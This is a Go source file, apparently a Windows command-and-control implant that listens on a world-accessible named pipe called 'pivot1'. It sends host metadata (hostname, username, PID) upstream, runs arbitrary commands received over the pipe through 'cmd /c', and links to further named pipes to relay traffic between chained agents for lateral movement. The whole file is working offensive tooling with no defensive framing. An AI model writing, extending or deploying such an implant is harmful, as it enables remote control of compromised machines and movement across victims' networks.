package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"sync"
	"time"

	"github.com/Microsoft/go-winio"
)

// --- 协议常量 ---
const (
	CMD_EXEC     = 0x01
	CMD_SMB      = 0x02
	CMD_FORWARD  = 0x03
	CMD_REGISTER = 0x04
	CMD_ACK      = 0x05
)

type Agent struct {
	AgentID  uint32
	Upstream net.Conn
	Children sync.Map
	writeMu  sync.Mutex
}

func ReadPacket(conn net.Conn) (cmd byte, payload []byte, err error) {
	// 1. 先读取4字节长度头
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return 0, nil, fmt.Errorf("read header failed: %w", err)
	}

	length := binary.BigEndian.Uint32(header)
	if length == 0 {
		return 0, nil, fmt.Errorf("invalid packet length: 0")
	}

	// 2. 读取命令字节 + payload
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return 0, nil, fmt.Errorf("read payload failed: %w", err)
	}

	cmd = data[0]
	if length > 1 {
		payload = data[1:]
	} else {
		payload = []byte{}
	}

	return cmd, payload, nil
}

func main() {
	//if len(os.Args) < 2 {
	//	fmt.Println("Usage: pivot <pipe_name>")
	//	return
	//}
	//pipeName := os.Args[1] // e.g., "demo" or "\\.\pipe\demo"
	pipeName := `\\.\pipe\pivot1`

	// 配置管道安全性和参数
	config := &winio.PipeConfig{
		// 安全描述符：允许所有用户读写（生产环境建议限制）
		// "D:P(A;;GA;;;BA)" = 仅管理员
		// "D:P(A;;GA;;;WD)" = 所有用户（World）
		SecurityDescriptor: "D:P(A;;GA;;;WD)",

		// 消息模式（vs 字节流模式）
		MessageMode: false,

		// 缓冲区大小（1MB）
		InputBufferSize:  1024 * 1024,
		OutputBufferSize: 1024 * 1024,
	}

	rand.Seed(time.Now().UnixNano())
	agentID := uint32(rand.Intn(100000) + 200000)

	fmt.Printf("[*] Pivot SMB Server listening on pipe: %s\n", pipeName)

	// 1. 创建管道 (服务端)
	listener, err := winio.ListenPipe(pipeName, config)
	if err != nil {
		log.Fatalf("[-] ListenPipe failed: %v", err)
	}
	defer listener.Close()
	fmt.Println("[*] Server: Waiting for connections...")

	conn, err := listener.Accept()
	if err != nil {
		log.Printf("[-] Accept failed: %v", err)
		return
	}

	fmt.Printf("[+] Server: Client connected from %v\n", conn.RemoteAddr())
	agent := &Agent{AgentID: agentID, Upstream: conn}

	// 发送注册包
	meta := collectMetadata(agent.AgentID)
	agent.WritePacket(CMD_REGISTER, meta)

	// 循环处理任务
	agent.HandleUpstream(conn)
}

func (a *Agent) HandleUpstream(conn net.Conn) {
	// 保存连接
	a.Upstream = conn
	defer conn.Close()

	for {
		// 读取完整的数据包
		cmd, payload, err := ReadPacket(conn)
		if err != nil {
			if err != io.EOF {
				fmt.Printf("[-] Upstream read error: %v\n", err)
			}
			break
		}

		// 处理命令
		switch cmd {

		case CMD_ACK:
			fmt.Printf("[*] Received ACK from upstream\n")

		case CMD_EXEC:
			res := RunCmd(string(payload))
			fmt.Printf("[+] Exec result: %s\n", res)
			a.WritePacket(CMD_EXEC, []byte(res))

		case CMD_SMB:
			// 级联连接: link <path>
			go a.AddPivot(string(payload))

		case CMD_FORWARD:
			if len(payload) < 4 {
				fmt.Printf("[-] Invalid FORWARD packet, length=%d\n", len(payload))
				continue
			}

			routeID := binary.BigEndian.Uint32(payload[0:4])
			inner := payload[4:]

			fmt.Printf("[*] FORWARD to RouteID=%d, data_len=%d\n", routeID, len(inner))

			if val, ok := a.Children.Load(routeID); ok {
				childConn := val.(net.Conn)
				if _, err := childConn.Write(inner); err != nil {
					fmt.Printf("[-] Failed to write to child %d: %v\n", routeID, err)
					childConn.Close()
					a.Children.Delete(routeID)
				} else {
					fmt.Printf("[+] Forwarded to RouteID=%d\n", routeID)
				}
			} else {
				fmt.Printf("[-] RouteID %d not found\n", routeID)
			}

		default:
			fmt.Printf("[-] Unknown command: 0x%02x\n", cmd)
		}
	}

	fmt.Println("[-] Upstream disconnected, exiting...")
}

func (a *Agent) WritePacket(cmd byte, payload []byte) {
	a.writeMu.Lock()
	defer a.writeMu.Unlock()

	buf := make([]byte, 4+1+len(payload))
	binary.BigEndian.PutUint32(buf[0:4], uint32(1+len(payload)))
	buf[4] = cmd
	copy(buf[5:], payload)

	a.Upstream.Write(buf)
}

func (a *Agent) AddPivot(fullPath string) {
	// 设置连接超时
	timeout := 10 * time.Second

	// 连接到命名管道
	conn, err := winio.DialPipe(fullPath, &timeout)
	if err != nil {
		fmt.Printf("[-] Link child failed: %v\n", err)
		return
	}

	routeID := uint32(rand.Intn(90000) + 10000)
	a.Children.Store(routeID, conn)

	// 启动 handleChild 监听子节点数据
	go a.handleChild(routeID, conn)
}

func (a *Agent) handleChild(routeID uint32, conn net.Conn) {
	defer conn.Close()
	defer a.Children.Delete(routeID)

	buf := make([]byte, 1024*1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			break
		}

		// 收到子节点完整包 -> 封装 FORWARD -> 发给上游
		pkt := buf[:n]
		wrap := make([]byte, 4+len(pkt))
		binary.BigEndian.PutUint32(wrap[0:4], routeID)
		copy(wrap[4:], pkt)

		a.WritePacket(CMD_FORWARD, wrap)
	}
}

func RunCmd(c string) string {
	cmd := exec.Command("cmd", "/c", c)
	o, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(o)
}

func collectMetadata(id uint32) []byte {
	u, _ := user.Current()
	h, _ := os.Hostname()
	meta := map[string]interface{}{
		"agent_id": id, "os": runtime.GOOS, "arch": runtime.GOARCH,
		"hostname": h, "username": u.Username, "process": os.Args[0], "pid": os.Getpid(),
	}
	b, _ := json.Marshal(meta)
	return b
}
